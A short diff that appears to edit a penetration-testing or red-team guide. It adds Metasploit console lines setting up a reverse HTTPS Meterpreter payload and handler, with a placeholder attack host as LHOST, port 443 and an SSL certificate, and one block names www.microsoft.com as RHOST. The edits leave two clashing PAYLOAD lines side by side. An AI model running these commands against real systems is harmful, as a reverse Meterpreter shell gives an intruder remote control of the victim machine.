@@ -156,6 +156,7 @@ set LHOST [Attack Host]
 set LPORT 443
 set HandlerSSLCert [Path to PEM generated]
 set StagerVerifySSLCert true
+set PAYLOAD windows/x64/meterpreter/reverse_https
 set PAYLOAD windows/meterpreter/reverse_https
 run -j
 ```
@@ -373,6 +374,7 @@ set RHOST www.microsoft.com
 run
 
 use payload/windows/x64/meterpreter/reverse_https
+use payload/windows/meterpreter/reverse_https
 set LHOST [Attack Host]
 set LPORT 443
 set HandlerSSLCert [Path to PEM generated]
